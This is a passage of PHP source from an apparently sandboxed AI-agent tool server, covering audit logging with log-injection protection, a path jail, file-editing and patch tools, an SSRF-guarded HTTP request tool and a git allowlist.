                $data = @file_get_contents(self::builtinPath($name, $cwd));
                if ($data === false) {
                    $err .= "base64: $name: no such file or directory" . PHP_EOL;
                    $exit = 1;
                    continue;
                }
            }
            if ($decode) {
                $raw = base64_decode(preg_replace('/\s+/', '', $data), true);
                if ($raw === false) {
                    $err .= "base64: invalid input" . PHP_EOL;
                    $exit = 1;
                    continue;
                }
                $out .= $raw;
            } else {
                $encoded = base64_encode($data);
                $out .= $wrap > 0 ? chunk_split($encoded, $wrap, PHP_EOL) : $encoded . PHP_EOL;
            }
        }
        return [$out, $err, $exit];
    }

    /** md5sum/sha256sum, without spawning a process. */
    private static function builtinHash($args, $cwd, $algo) {
        $out = '';
        $err = '';
        $exit = 0;
        $any = false;
        foreach ($args as $name) {
            if ($name === '' || $name[0] === '-') { continue; }
            $any = true;
            $hash = @hash_file($algo, self::builtinPath($name, $cwd));
            if ($hash === false) {
                $err .= "$algo" . "sum: $name: no such file or directory" . PHP_EOL;
                $exit = 1;
                continue;
            }
            $out .= $hash . '  ' . $name . PHP_EOL;
        }
        if (!$any) {
            $err = "usage: {$algo}sum <file>" . PHP_EOL;
            $exit = 1;
        }
        return [$out, $err, $exit];
    }

    /**
     * Append one audit line to storage/exec.log.
     *
     * Two lines per run: `phase=start` BEFORE the process is spawned, and
     * `phase=end` once it has been reaped. The start line is the whole point --
     * the end line can only be written after the wait, so a request killed
     * mid-command (the operator force-stops, the server restarts, a GUI app
     * stays open) used to leave no record at all. A run that never reported back
     * is now visible as a start with no end, which is the question "did
     * anything actually run?" needs answered.
     *
     * `run` joins the pair, `agent` says who asked for it, and `kind` separates
     * the command allowlist from the code interpreter. Older one-line records
     * (ts exit=.. ms=.. cwd=.. :: prog args) still parse -- see readExecLog() --
     * so the existing log stays readable.
     *
     * Public so the Programs launcher writes the same two-phase record with a
     * different `kind` -- a GUI window that stays open is one of the cases this
     * format was built for, and it must not be invisible in TRACE -> EXEC.
     */
    public static function audit($program, $argv, $cwd, $exit, $ms, array $meta = []) {
        try {
            $dir = self::appDir() . '/storage';
            if (!is_dir($dir)) { return; }
            // ONE line per record, which makes a newline a forged record: the
            // agent name arrives in the tool call and an argv element can hold
            // anything a model sent, so "\n" plus a hand-written line that
            // looks exactly like this one would land in the trace as a command
            // that never ran (or hide one that did). Control characters are
            // stripped HERE, at the one place every audited action passes
            // through, rather than at each of the callers -- and before the
            // quoting decision below, so a quote-escaped value cannot carry a
            // line break through it either.
            // Two shapes, because the line carries two kinds of field. The ones
            // the parser reads as a SINGLE token (run, phase, kind, agent) lose
            // the control characters entirely -- a space would split the field
            // and make the whole line unparseable, which loses a real record
            // while stopping a forged one. cwd, the program and the argv are
            // free text and read better with the break turned into a space.
            $token = function ($s) {
                // Everything from the first break on is dropped. A field the
                // parser reads as ONE token cannot carry a second record, and
                // keeping the first token is more recognisable than mangling
                // the whole string into one run-together word.
                $s = (string)(preg_split('/[\s\x00-\x1f\x7f]+/', (string)$s)[0] ?? '');
                $s = (string)preg_replace('/[^\w.:@-]/', '', $s);
                if ($s === '') { return '-'; }   // an empty token breaks the regex
                return strlen($s) > 120 ? substr($s, 0, 120) . '...' : $s;
            };
            $text = function ($s) {
                $s = (string)preg_replace('/[\x00-\x1f\x7f]+/', ' ', (string)$s);
                return strlen($s) > 240 ? substr($s, 0, 240) . '...' : $s;
            };
            $safe = implode(' ', array_map(function ($a) use ($text) {
                $a = $text($a);
                return preg_match('/^[\w\.\/:=-]+$/', $a) ? $a : escapeshellarg($a);
            }, array_slice($argv, 0, 12)));
            $line = sprintf(
                "%s run=%s phase=%s kind=%s agent=%s exit=%s ms=%s timeout=%s cwd=%s :: %s %s\n",
                gmdate('Y-m-d\TH:i:sZ'),
                $token($meta['run'] ?? '-'),
                $token($meta['phase'] ?? 'end'),
                $token($meta['kind'] ?? 'exec'),
                $token($meta['agent'] ?? '-'),
                $exit === null ? '-' : (string)(int)$exit,
                $ms === null ? '-' : (string)(int)$ms,
                empty($meta['timeout']) ? '0' : '1',
                $text($cwd),
                $text($program),
                $safe
            );
            file_put_contents($dir . '/exec.log', $line, FILE_APPEND | LOCK_EX);
        } catch (\Throwable $e) {
            // Auditing must never be the reason a command fails to run.
        }
    }

    /**
     * Tail storage/exec.log and turn it into runs, newest first.
     *
     * Read-only and bounded: only the last chunk of the file is read and only
     * the last `$limit` lines are parsed, so a large log cannot be dragged into
     * a request. Start and end lines are paired by their `run` id; a start with
     * no end comes back as `finished: false`, which is the case worth seeing.
     */
    public static function readExecLog($limit = 300, $agent = '') {
        $limit = max(1, min(1000, (int)$limit));
        $path = self::appDir() . '/storage/exec.log';
        $out = ['entries' => [], 'path' => 'storage/exec.log', 'size' => 0, 'truncated' => false];
        if (!is_file($path)) { return $out; }

        $size = (int)@filesize($path);
        $out['size'] = $size;
        $fh = @fopen($path, 'rb');
        if ($fh === false) { return $out; }
        $chunk = 262144;
        $from = max(0, $size - $chunk);
        @fseek($fh, $from);
        $raw = (string)@stream_get_contents($fh);
        @fclose($fh);

        // A chunk boundary can slice a line in half; the partial first line is
        // dropped rather than parsed into nonsense.
        if ($from > 0) {
            $nl = strpos($raw, "\n");
            $raw = $nl === false ? '' : substr($raw, $nl + 1);
            $out['truncated'] = true;
        }

        $lines = preg_split('/\r?\n/', $raw) ?: [];
        $lines = array_values(array_filter($lines, function ($l) { return trim($l) !== ''; }));
        $lines = array_slice($lines, -$limit);

        $runs = [];
        $synthetic = 0;
        foreach ($lines as $line) {
            $e = self::parseAuditLine($line);
            if ($e === null) { continue; }
            $key = $e['run'] !== '-' ? $e['run'] : 'legacy-' . (++$synthetic);
            if (!isset($runs[$key])) {
                $runs[$key] = [
                    'id' => $key,
                    'startedAt' => null,
                    'endedAt' => null,
                    'finished' => false,
                    'kind' => $e['kind'],
                    'agent' => $e['agent'],
                    'command' => $e['command'],
                    'cwd' => $e['cwd'],
                    'exit' => null,
                    'ms' => null,
                    'timeout' => false,
                ];
            }
            $r =& $runs[$key];
            if ($e['phase'] === 'start') {
                $r['startedAt'] = $e['ts'];
            } else {
                $r['endedAt'] = $e['ts'];
                $r['finished'] = true;
                $r['exit'] = $e['exit'] === '-' ? null : (int)$e['exit'];
                $r['ms'] = $e['ms'] === '-' ? null : (int)$e['ms'];
                $r['timeout'] = $e['timeout'] === '1';
            }
            // Both halves carry the same command; the later one wins so the
            // resolved program path from the end line replaces the raw name.
            if ($e['command'] !== '') { $r['command'] = $e['command']; }
            if ($e['cwd'] !== '') { $r['cwd'] = $e['cwd']; }
            if ($e['agent'] !== '-') { $r['agent'] = $e['agent']; }
            unset($r);
        }

        $entries = array_values($runs);
        if ($agent !== '') {
            $want = (string)$agent;
            $entries = array_values(array_filter($entries, function ($e) use ($want) {
                return $e['agent'] === $want;
            }));
        }
        usort($entries, function ($a, $b) {
            return ($b['endedAt'] ?: $b['startedAt'] ?: 0) <=> ($a['endedAt'] ?: $a['startedAt'] ?: 0);
        });
        $out['entries'] = array_slice($entries, 0, $limit);
        return $out;
    }

    /** One parsed audit line, or null when it is not one. Both shapes. */
    private static function parseAuditLine($line) {
        $line = rtrim((string)$line, "\r\n");
        $new = '/^(\S+)\s+run=(\S+)\s+phase=(\S+)\s+kind=(\S+)\s+agent=(\S+)\s+exit=(\S+)\s+ms=(\S+)\s+timeout=(\S+)\s+cwd=(.*?)\s+::\s*(.*)$/';
        if (preg_match($new, $line, $m)) {
            return [
                'ts' => self::auditTime($m[1]),
                'run' => $m[2],
                'phase' => $m[3],
                'kind' => $m[4],
                'agent' => $m[5],
                'exit' => $m[6],
                'ms' => $m[7],
                'timeout' => $m[8],
                'cwd' => $m[9],
                'command' => $m[10],
            ];
        }
        // Older lines: written after the process exited, so they are a finished
        // run with no start half and no agent attribution.
        $old = '/^(\S+)\s+exit=(-?\d+)\s+ms=(\d+)\s+cwd=(.*?)\s+::\s*(.*)$/';
        if (preg_match($old, $line, $m)) {
            return [
                'ts' => self::auditTime($m[1]),
                'run' => '-',
                'phase' => 'end',
                'kind' => 'exec',
                'agent' => '-',
                'exit' => $m[2],
                'ms' => $m[3],
                'timeout' => '0',
                'cwd' => $m[4],
                'command' => $m[5],
            ];
        }
        return null;
    }

    /**
     * Epoch seconds from the log's UTC stamp; 0 when it cannot be read.
     *
     * `gmdate('Y-m-d\TH:i:sZ')` ends with the numeric UTC offset ("0"), NOT a
     * literal Z -- so the stamp reads `2026-10-27T04:12:250`. The first 19
     * characters are the real ISO stamp; everything after them is that offset.
     * Both the old and new line shapes use it, so this is the only reader.
     */
    private static function auditTime($stamp) {
        $iso = substr(trim((string)$stamp), 0, 19);
        $dt = \DateTime::createFromFormat('Y-m-d\TH:i:s', $iso, new \DateTimeZone('UTC'));
        return $dt === false ? 0 : $dt->getTimestamp();
    }

    /** Which commands this install would permit. Safe to show in the UI. */
    public static function execAllowListPublic() {
        $cfg = self::config();
        return [
            'enabled' => (bool)$cfg['exec_enabled'],
            'allow'   => $cfg['exec_allow'],
            // Sent so the editor can show both lists and flag entries that can
            // never match, instead of letting an inert name sit there looking
            // like it granted something.
            'deny'    => $cfg['exec_deny'],
            // Interpreters granted script-only execution. Off by default.
            'interpreters' => $cfg['exec_interpreters'],
            'interpreters_full' => $cfg['exec_interpreters_full'],
            'custom_interpreters_full' => array_key_exists('exec_interpreters_full', self::sandboxBlock()),
            'interpreter_inline_flags' => [],
            'custom_interpreters' => array_key_exists('exec_interpreters', self::sandboxBlock()),
            // True when the operator has pinned a custom list, in which case
            // the UI must not imply the built-in defaults are still in force.
            'custom_allow' => array_key_exists('exec_allow', self::sandboxBlock()),
            'custom_deny'  => array_key_exists('exec_deny', self::sandboxBlock()),
            // The BUILT-IN denylist, always, even when a custom one is active.
            // Without it an operator who replaced the defaults has no way to see
            // what they replaced -- so "put it back the way it shipped" was
            // reachable only by reinstalling. Sent for the UI's restore control;
            // it says nothing about the running policy.
            'deny_defaults' => self::execDenyList([]),
        ];
    }

    /** The raw sandbox block from config.json, for key-presence checks. */
    private static function sandboxBlock() {
        $cfg = self::config();
        return is_array($cfg['_sandbox_raw'] ?? null) ? $cfg['_sandbox_raw'] : [];
    }

    // ---------------------------------------------------------------
    // Path jail
    // ---------------------------------------------------------------

    /**
     * Resolve a caller-supplied path against the allowlist.
     *
     * Relative paths are tried under each root in turn. The check is done on
     * the *resolved* path, so ".." segments, absolute paths, and symlinks that
     * point outside a root are all rejected by the same comparison.
     *
     * For a file that does not exist yet (write), the deepest existing ancestor
     * is resolved instead -- otherwise mkdir("../evil") would look harmless.
     *
     * @return string absolute path inside a root
     * @throws \RuntimeException when the path escapes the jail
     */
    private static function jail($path, $roots, $label) {
        $path = trim(str_replace('\\', '/', (string)$path));
        if ($path === '') { throw new \RuntimeException("$label: empty path"); }
        if (strpos($path, "\0") !== false) { throw new \RuntimeException("$label: path contains a null byte"); }
        if (!$roots) {
            throw new \RuntimeException(
                "$label: the sandbox has no allowed directories (it defaults to this app's "
                . 'own folder). Set one in the Config tab ("Working Project Directory"), or '
                . 'in storage/config.json under "sandbox".'
            );
        }

        $candidates = [];
        if ($path[0] === '/' || preg_match('/^[a-z]:\//i', $path)) {
            $candidates[] = $path;
        } else {
            foreach ($roots as $root) { $candidates[] = $root . '/' . $path; }
        }

        foreach ($candidates as $candidate) {
            $resolved = self::resolveExisting($candidate);
            if ($resolved === null) { continue; }
            foreach ($roots as $root) {
                if ($resolved === $root || strpos($resolved, $root . '/') === 0) {
                    // Inside a root, but the protect list still refuses secrets.
                    if (self::isProtectedPath($resolved)) {
                        throw new \RuntimeException("$label: \"$resolved\" is on the protected list "
                            . '(secrets). Edit or clear "protect" in the MCP Server config to allow it.');
                    }
                    return $resolved;
                }
            }
        }
        throw new \RuntimeException(
            "$label: path is outside the allowed directories. Allowed: " . implode(', ', $roots)
        );
    }

    /**
     * Normalise a path that may not exist yet. Walks up to the deepest ancestor
     * that does exist, resolves THAT with realpath (which collapses ".." and
     * follows symlinks), then re-appends the missing tail.
     *
     * @return string|null null when an ancestor cannot be resolved at all
     */
    private static function resolveExisting($candidate) {
        $candidate = str_replace('\\', '/', $candidate);
        $tail = [];
        $probe = $candidate;

        for ($i = 0; $i < 64; $i++) {
            $real = realpath($probe);
            if ($real !== false) {
                $real = rtrim(str_replace('\\', '/', $real), '/');
                if ($tail) { $real .= '/' . implode('/', $tail); }
                return $real;
            }
            $parent = dirname($probe);
            if ($parent === $probe) { return null; }
            array_unshift($tail, basename($probe));
            $probe = $parent;
        }
        return null;
    }

    private static function readRoots() {
        $c = self::config();
        return $c['read_roots'];
    }

    private static function writeRoots() {
        $c = self::config();
        return $c['write_roots'];
    }

    /**
     * Narrow a global root list to the one directory an agent is assigned to.
     *
     * The scope is always checked against the global allowlist first, so a
     * browser cannot turn "this agent works in subdir" into "read the whole
     * server". An empty scope means the old behaviour: every allowed root.
     */
    private static function scopeRoots($scope, $roots, $label) {
        $scope = trim((string)$scope);
        if ($scope === '') { return $roots; }
        $real = realpath($scope);
        if ($real === false || !is_dir($real)) {
            throw new \RuntimeException("$label: sandbox directory does not exist: $scope");
        }
        $real = rtrim(str_replace('\\', '/', $real), '/');
        foreach ($roots as $root) {
            if ($real === $root || strpos($real, $root . '/') === 0) {
                return [$real];
            }
        }
        throw new \RuntimeException("$label: sandbox directory is outside the allowed roots: $scope");
    }

    /** A per-file entry the Brain Lab file manager can render. */
    private static function entryInfo($path, $name, $type = null) {
        $isDir = $type === 'dir' || ($type === null && is_dir($path));
        $mode = @fileperms($path);
        return [
            'name' => $name,
            'type' => $isDir ? 'dir' : 'file',
            'size' => $isDir ? null : @filesize($path),
            'mtime' => @filemtime($path) ?: null,
            'mode' => $mode !== false ? substr(sprintf('%o', $mode), -4) : null,
            'ext' => $isDir ? '' : strtolower((string)pathinfo($name, PATHINFO_EXTENSION)),
            'mime' => $isDir ? null : self::mimeFor($name),
            'link' => is_link($path),
        ];
    }

    /** Small extension map so previews work even when fileinfo is absent. */
    private static function mimeFor($path) {
        static $map = [
            'txt' => 'text/plain', 'md' => 'text/markdown', 'markdown' => 'text/markdown',
            'html' => 'text/html', 'htm' => 'text/html', 'css' => 'text/css',
            'js' => 'text/javascript', 'mjs' => 'text/javascript', 'json' => 'application/json',
            'xml' => 'application/xml', 'svg' => 'image/svg+xml', 'csv' => 'text/csv',
            'php' => 'text/plain', 'py' => 'text/plain', 'sh' => 'text/plain',
            'yml' => 'text/plain', 'yaml' => 'text/plain', 'log' => 'text/plain',
            'png' => 'image/png', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg',
            'gif' => 'image/gif', 'webp' => 'image/webp', 'bmp' => 'image/bmp',
            'ico' => 'image/x-icon', 'avif' => 'image/avif',
            'pdf' => 'application/pdf', 'zip' => 'application/zip',
            'gz' => 'application/gzip', 'tar' => 'application/x-tar',
            'mp3' => 'audio/mpeg', 'wav' => 'audio/wav', 'mp4' => 'video/mp4',
            'webm' => 'video/webm', 'doc' => 'application/msword',
            'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        ];
        $ext = strtolower((string)pathinfo($path, PATHINFO_EXTENSION));
        if (function_exists('finfo_open') && in_array($ext, ['png', 'jpg', 'jpeg', 'gif', 'webp', 'pdf'], true)) {
            $fi = @finfo_open(FILEINFO_MIME_TYPE);
            if ($fi) {
                $mime = @finfo_file($fi, $path);
                finfo_close($fi);
                if (is_string($mime) && $mime !== '') { return $mime; }
            }
        }
        return $map[$ext] ?? 'application/octet-stream';
    }

    // ---------------------------------------------------------------
    // Filesystem
    // ---------------------------------------------------------------

    /**
     * Read a text file, with line numbers so a model can quote accurately.
     * Optional $range = "start-end" (1-based, inclusive) reads a slice.
     */
    public static function readFile($path, $range = null, $scope = null) {
        $roots = self::scopeRoots($scope, self::readRoots(), 'read_file');
        $full = self::jail($path, $roots, 'read_file');
        if (!is_file($full)) {
            throw new \RuntimeException("read_file: not a file: $full");
        }

        $c = self::config();
        $size = filesize($full);
        if ($size === false) { throw new \RuntimeException('read_file: cannot stat file'); }

        $raw = file_get_contents($full, false, null, 0, min($size, $c['max_read_bytes']));
        if ($raw === false) { throw new \RuntimeException('read_file: cannot read file'); }

        // Binary guard: a NUL byte in the first 8KB means this is not source.
        if (strpos(substr($raw, 0, 8192), "\0") !== false) {
            throw new \RuntimeException('read_file: looks like a binary file');
        }
        $truncated = $size > strlen($raw);

        $lines = preg_split('/\r\n|\r|\n/', $raw);
        if ($range !== null && $range !== '') {
            if (!preg_match('/^(\d+)\s*-\s*(\d+)?$/', trim((string)$range), $m)) {
                throw new \RuntimeException('read_file: range must look like "20-80"');
            }
            $start = max(1, (int)$m[1]);
            $end = isset($m[2]) && $m[2] !== '' ? (int)$m[2] : count($lines);
            if ($end < $start) { $end = $start; }
            $slice = array_slice($lines, $start - 1, $end - $start + 1);
            $numbered = self::number($slice, $start);
        } else {
            $numbered = self::number($lines, 1);
        }

        $body = implode("\n", $numbered);
        $body = self::clip($body);
        return [
            'path' => $full,
            'bytes' => $size,
            'truncated' => $truncated || strlen($body) < strlen(implode("\n", $numbered)),
            'content' => $body,
        ];
    }

    /** Write (or append to) a file, creating parent directories. */
    public static function writeFile($path, $content, $mode = 'write', $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'write_file');
        $full = self::jail($path, $roots, 'write_file');
        $parent = dirname($full);
        if (!is_dir($parent) && !@mkdir($parent, 0775, true) && !is_dir($parent)) {
            throw new \RuntimeException("write_file: cannot create directory $parent");
        }
        $content = (string)$content;
        $append = in_array($mode, ['append', 'a'], true);
        $bytes = @file_put_contents($full, $content, $append ? FILE_APPEND : 0);
        if ($bytes === false) { throw new \RuntimeException("write_file: cannot write $full"); }
        return [
            'path' => $full,
            'bytes_written' => $bytes,
            'appended' => $append,
            'total_bytes' => filesize($full),
        ];
    }

    /**
     * Exact string replacement — the primitive behind the editor tools.
     *
     * Models are trained on search/replace editing (Claude's str_replace, and
     * Cursor/Aider's edit_file), and it is far safer than rewriting a whole
     * file: a mistaken match fails loudly instead of clobbering good code.
     * $old must be unique unless $all is set, so an ambiguous edit is refused
     * rather than guessed.
     */
    public static function strReplace($path, $old, $new, $all = false, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'str_replace');
        $full = self::jail($path, $roots, 'str_replace');
        if (!is_file($full)) { throw new \RuntimeException("str_replace: not a file: $full"); }
        $raw = @file_get_contents($full);
        if ($raw === false) { throw new \RuntimeException("str_replace: cannot read $full"); }
        $old = (string)$old;
        $new = (string)$new;
        if ($old === '') { throw new \RuntimeException('str_replace: "old" string is empty'); }
        if ($old === $new) { throw new \RuntimeException('str_replace: "old" and "new" are identical'); }

        $count = substr_count($raw, $old);
        if ($count === 0) {
            throw new \RuntimeException('str_replace: old string not found. Read the file first and '
                . 'match it exactly, including indentation and line endings.');
        }
        if ($count > 1 && !$all) {
            throw new \RuntimeException("str_replace: old string appears $count times. Include more "
                . 'surrounding context to make it unique, or pass "replace_all": true.');
        }
        if ($all) {
            $updated = str_replace($old, $new, $raw);
        } else {
            $pos = strpos($raw, $old);
            $updated = substr_replace($raw, $new, $pos, strlen($old));
        }
        $bytes = @file_put_contents($full, $updated);
        if ($bytes === false) { throw new \RuntimeException("str_replace: cannot write $full"); }
        return ['path' => $full, 'replaced' => $all ? $count : 1, 'bytes' => $bytes];
    }

    /**
     * Insert a block of text at a line. $line is the 1-based line to insert
     * AFTER; 0 inserts at the top of the file. Matches the editor tool family.
     */
    public static function insertAt($path, $line, $text, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'insert');
        $full = self::jail($path, $roots, 'insert');
        if (!is_file($full)) { throw new \RuntimeException("insert: not a file: $full"); }
        $raw = @file_get_contents($full);
        if ($raw === false) { throw new \RuntimeException("insert: cannot read $full"); }
        $lines = preg_split('/\r\n|\r|\n/', $raw);
        $line = (int)$line;
        if ($line < 0 || $line > count($lines)) {
            throw new \RuntimeException('insert: line must be between 0 and ' . count($lines)
                . ' (0 inserts at the top, N inserts after line N)');
        }
        $block = explode("\n", str_replace(["\r\n", "\r"], "\n", (string)$text));
        array_splice($lines, $line, 0, $block);
        $bytes = @file_put_contents($full, implode("\n", $lines));
        if ($bytes === false) { throw new \RuntimeException("insert: cannot write $full"); }
        return ['path' => $full, 'inserted_after' => $line, 'lines' => count($lines), 'bytes' => $bytes];
    }

    /**
     * Apply a Codex/GPT "V4A" patch. This is the format OpenAI models emit for
     * apply_patch: one envelope can add, delete, update and move several files.
     *
     *   *** Begin Patch
     *   *** Add File: src/new.js
     *   +line one
     *   *** Update File: src/app.js
     *   @@ optional section label
     *    context line
     *   -removed
     *   +added
     *   *** Update File: src/a.js
     *   *** Move to: src/b.js
     *   @@
     *    ...
     *   *** Delete File: src/old.js
     *   *** End Patch
     *
     * Every touch goes through the same jail as the other file tools. An
     * update hunk must match its context EXACTLY and UNIQUELY, so a stale or
     * ambiguous patch fails loudly instead of corrupting a file.
     */
    public static function applyPatch($patch, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'apply_patch');
        $jailTo = function ($rel) use ($roots) { return self::jail($rel, $roots, 'apply_patch'); };

        $text = str_replace(["\r\n", "\r"], "\n", (string)$patch);
        $lines = explode("\n", $text);
        $n = count($lines);
        $i = 0;
        while ($i < $n && trim($lines[$i]) !== '*** Begin Patch') { $i++; }
        if ($i >= $n) { throw new \RuntimeException('apply_patch: no "*** Begin Patch" envelope found'); }
        $i++;

        $results = [];
        $ensureDir = function ($full) {
            $parent = dirname($full);
            if (!is_dir($parent) && !@mkdir($parent, 0775, true) && !is_dir($parent)) {
                throw new \RuntimeException("apply_patch: cannot create directory $parent");
            }
        };

        while ($i < $n) {
            $raw = $lines[$i];
            $t = trim($raw);
            if ($t === '*** End Patch' || $t === '*** End Patch.') { $i++; break; }
            if ($t === '') { $i++; continue; }
            if (strpos($t, '*** ') !== 0) {
                throw new \RuntimeException("apply_patch: unexpected line outside a file section: $t");
            }

            if (strpos($t, '*** Add File:') === 0) {
                $rel = trim(substr($t, strlen('*** Add File:')));
                $i++;
                $content = [];
                while ($i < $n && strpos($lines[$i], '***') !== 0) {
                    $l = $lines[$i];
                    if ($l !== '' && $l[0] === '+') { $content[] = substr($l, 1); }
                    elseif ($l !== '' && $l[0] === '-') { /* ignore stray removals on an add */ }
                    elseif (trim($l) !== '') { $content[] = ltrim($l); }
                    $i++;
                }
                $full = $jailTo($rel);
                if (file_exists($full)) { throw new \RuntimeException("apply_patch: add failed, already exists: $rel"); }
                $ensureDir($full);
                $body = $content ? implode("\n", $content) . "\n" : '';
                if (@file_put_contents($full, $body) === false) { throw new \RuntimeException("apply_patch: cannot write $rel"); }
                $results[] = ['op' => 'add', 'path' => $full, 'lines' => count($content)];
                continue;
            }

            if (strpos($t, '*** Delete File:') === 0) {
                $rel = trim(substr($t, strlen('*** Delete File:')));
                $i++;
                $full = $jailTo($rel);
                if (!is_file($full)) { throw new \RuntimeException("apply_patch: delete failed, not a file: $rel"); }
                if (!@unlink($full)) { throw new \RuntimeException("apply_patch: cannot delete $rel"); }
                $results[] = ['op' => 'delete', 'path' => $full];
                continue;
            }

            if (strpos($t, '*** Update File:') === 0) {
                $rel = trim(substr($t, strlen('*** Update File:')));
                $i++;
                while ($i < $n && trim($lines[$i]) === '') { $i++; }
                $moveTo = null;
                if ($i < $n && strpos(trim($lines[$i]), '*** Move to:') === 0) {
                    $moveTo = trim(substr(trim($lines[$i]), strlen('*** Move to:')));
                    $i++;
                }
                $hunkLines = [];
                while ($i < $n && strpos($lines[$i], '***') !== 0) { $hunkLines[] = $lines[$i]; $i++; }

                $full = $jailTo($rel);
                if (!is_file($full)) { throw new \RuntimeException("apply_patch: update failed, not a file: $rel"); }
                $rawFile = @file_get_contents($full);
                if ($rawFile === false) { throw new \RuntimeException("apply_patch: cannot read $rel"); }
                $rawFile = str_replace(["\r\n", "\r"], "\n", $rawFile);
                $updated = self::applyHunks($rawFile, $hunkLines, $rel);

                $dest = $full;
                if ($moveTo !== null && $moveTo !== '') {
                    $dest = $jailTo($moveTo);
                    $ensureDir($dest);
                }
                if (@file_put_contents($dest, $updated) === false) { throw new \RuntimeException("apply_patch: cannot write $rel"); }
                if ($dest !== $full) { @unlink($full); }
                $results[] = [
                    'op' => 'update',
                    'path' => $full,
                    'moved_to' => $dest === $full ? null : $dest,
                    'hunks' => self::countHunks($hunkLines),
                ];
                continue;
            }

            throw new \RuntimeException("apply_patch: unknown directive: $t");
        }

        if (!$results) { throw new \RuntimeException('apply_patch: the patch contained no changes'); }
        return ['applied' => $results, 'count' => count($results)];
    }

    private static function countHunks(array $hunkLines) {
        $h = 0;
        foreach ($hunkLines as $l) { if (strpos(ltrim($l), '@@') === 0) { $h++; } }
        return $h > 0 ? $h : ($hunkLines ? 1 : 0);
    }

    /**
     * Apply the body of one Update section to file text. Hunks are separated
     * by "@@" markers; a hunk is the context/removed lines (the "old" text)
     * and the context/added lines (the "new" text). Each old block must occur
     * exactly once, so an ambiguous patch is refused rather than mis-applied.
     */
    private static function applyHunks($raw, array $hunkLines, $rel) {
        // A move with no body: nothing to change, just relocate the file.
        if (!$hunkLines) { return $raw; }
        // Split into hunks on lines whose trimmed form starts with "@@".
        $hunks = [];
        $cur = [];
        $started = false;
        foreach ($hunkLines as $l) {
            if (strpos(ltrim($l), '@@') === 0) {
                if ($started) { $hunks[] = $cur; }
                $cur = [];
                $started = true;
                continue;
            }
            $cur[] = $l;
        }
        if ($cur || !$hunks) { $hunks[] = $cur; }

        $applied = 0;
        foreach ($hunks as $hunk) {
            $old = [];
            $new = [];
            foreach ($hunk as $l) {
                $prefix = $l === '' ? ' ' : $l[0];
                $rest = $l === '' ? '' : substr($l, 1);
                if ($prefix === ' ') { $old[] = $rest; $new[] = $rest; }
                elseif ($prefix === '-') { $old[] = $rest; }
                elseif ($prefix === '+') { $new[] = $rest; }
                // anything else is ignored (stray marker text)
            }
            if (!$old) {
                if ($new) { throw new \RuntimeException("apply_patch: hunk in $rel has additions but no context to anchor them"); }
                continue;   // empty hunk
            }
            $oldStr = implode("\n", $old);
            $newStr = implode("\n", $new);
            $count = substr_count($raw, $oldStr);
            if ($count === 0) {
                throw new \RuntimeException("apply_patch: hunk not found in $rel. The file changed, or the "
                    . 'context lines do not match exactly (including indentation). Re-read the file.');
            }
            if ($count > 1) {
                throw new \RuntimeException("apply_patch: hunk matches $count places in $rel. Add more "
                    . 'context lines so it is unique.');
            }
            $pos = strpos($raw, $oldStr);
            $raw = substr_replace($raw, $newStr, $pos, strlen($oldStr));
            $applied++;
        }
        if ($applied === 0) { throw new \RuntimeException("apply_patch: update to $rel made no changes"); }
        return $raw;
    }

    /**
     * One HTTP request with a caller-chosen method, headers and body.
     * The SSRF guard from fetchUrl applies (no private/metadata hosts), the
     * body is truncated, and the response status is returned so an agent can
     * branch on 404 vs 500 instead of guessing.
     */
    public static function httpRequest($method, $url, $headers = [], $body = null, $maxChars = 20000) {
        $method = strtoupper(trim((string)$method));
        if (!in_array($method, ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD'], true)) {
            $method = 'GET';
        }
        $url = trim((string)$url);
        // Same public-address rule as fetch_url: refuse loopback, LAN and the
        // cloud metadata endpoints before a byte leaves the box.
        self::assertPublicUrl($url);

        $send = [];
        if (is_array($headers)) {
            foreach ($headers as $k => $v) {
                $k = trim((string)$k);
                if ($k === '' || strpos($k, "\n") !== false || strpos($k, ':') !== false) { continue; }
                // Strip hop-by-hop / spoofing headers; curl sets its own.
                if (in_array(strtolower($k), ['host', 'content-length', 'accept-encoding', 'connection'], true)) { continue; }
                $v = str_replace(["\r", "\n"], '', (string)$v);
                $send[] = "$k: $v";
            }
        }
        $send[] = 'User-Agent: ' . self::USER_AGENT;

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        if ($body !== null && $body !== '' && $method !== 'GET' && $method !== 'HEAD') {
            curl_setopt($ch, CURLOPT_POSTFIELDS, (string)$body);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $send);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        $proxy = self::activeProxy();
        if ($proxy !== '') {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }
        $resp = curl_exec($ch);
        $err = curl_error($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $mime = (string)curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        curl_close($ch);

        if ($resp === false) {
            throw new \RuntimeException('http_request: ' . ($err !== '' ? $err : 'request failed'));
        }
        $limit = max(1000, min(200000, (int)$maxChars));
        $truncated = strlen($resp) > $limit;
        if ($truncated) { $resp = substr($resp, 0, $limit); }
        return [
            'url' => $url,
            'status' => $code,
            'content_type' => $mime,
            'truncated' => $truncated,
            'body' => $resp,
        ];
    }

    /** Git subcommands this tool will run. Anything else is refused. */
    private static function gitAllowed() {
        return [
            'status', 'diff', 'log', 'show', 'branch', 'remote', 'rev-parse', 'ls-files',
            'blame', 'shortlog', 'describe', 'tag', 'grep', 'whatchanged', 'reflog',
            'add', 'commit', 'checkout', 'switch', 'restore', 'reset', 'merge', 'rebase',
            'cherry-pick', 'stash', 'init', 'fetch', 'pull', 'push', 'rm', 'mv', 'config', 'ls-tree',
        ];
    }

    /**
